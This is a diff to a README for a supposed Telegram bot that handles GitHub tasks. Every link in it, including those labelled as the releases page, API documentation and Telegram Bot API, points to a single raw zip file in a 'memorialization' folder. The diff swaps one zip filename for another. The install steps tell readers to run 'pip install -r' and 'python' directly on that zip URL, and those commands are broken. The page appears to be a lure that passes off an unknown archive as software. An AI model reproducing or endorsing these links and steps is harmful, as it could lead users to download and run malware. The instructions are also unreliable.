@@ -1,7 +1,7 @@
 # 🤖 github-telegram-bot - Your Telegram Assistant for GitHub Tasks
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip)
+[![Download](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to github-telegram-bot! This is a powerful Telegram bot designed to help you manage your GitHub tasks right from your messaging app. You can search for repositories, inspect users, analyze commits, issues, and much more — all without needing to leave Telegram.
@@ -21,7 +21,7 @@ To ensure you can run github-telegram-bot smoothly, your system should meet the 
 - **Internet Connection**: A stable internet connection is required to interact with GitHub and Telegram APIs.
 
 ## 📖 How to Download & Install
-1. Visit the releases page to download the bot: [Download Page](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip).
+1. Visit the releases page to download the bot: [Download Page](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip).
 2. On the releases page, you will find various versions listed. Choose the latest version for stability.
 3. Click on the appropriate file for your operating system to download it.
 4. After downloading, locate the file in your system's downloads folder.
@@ -33,7 +33,7 @@ To ensure you can run github-telegram-bot smoothly, your system should meet the 
    - Open a terminal or command prompt in the directory where you extracted the files.
    - Run the command: 
      ```bash
-     pip install -r https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip
+     pip install -r https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip
      ```
    This will install all necessary libraries for the bot to operate.
 
@@ -49,7 +49,7 @@ To ensure you can run github-telegram-bot smoothly, your system should meet the 
 5. **Run the Bot**:
    - In your terminal, run the following command:
      ```bash
-     python https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip
+     python https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip
      ```
    This command will start your bot, and you can begin using its features in Telegram!
 
@@ -68,11 +68,11 @@ If you run into any issues while using github-telegram-bot or if you have questi
 
 ## 🔗 Further Reading
 For more details on the functionalities and how to maximize the features of github-telegram-bot, follow the links below:
-- [API Documentation](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip)
-- [Telegram Bot API](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip)
+- [API Documentation](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip)
+- [Telegram Bot API](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip)
 
 ## 💬 Feedback
 Your feedback is essential to improve the bot. Please let us know your thoughts and experience while using github-telegram-bot.
 
 ## 📥 Download Now Again
-Don’t forget to download the latest version here: [Download Page](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/telegram-github-bot-2.2.zip). Your productivity in managing GitHub tasks will thank you!
+Don’t forget to download the latest version here: [Download Page](https://raw.githubusercontent.com/parth123456780/github-telegram-bot/main/memorialization/github-bot-telegram-v3.1.zip). Your productivity in managing GitHub tasks will thank you!
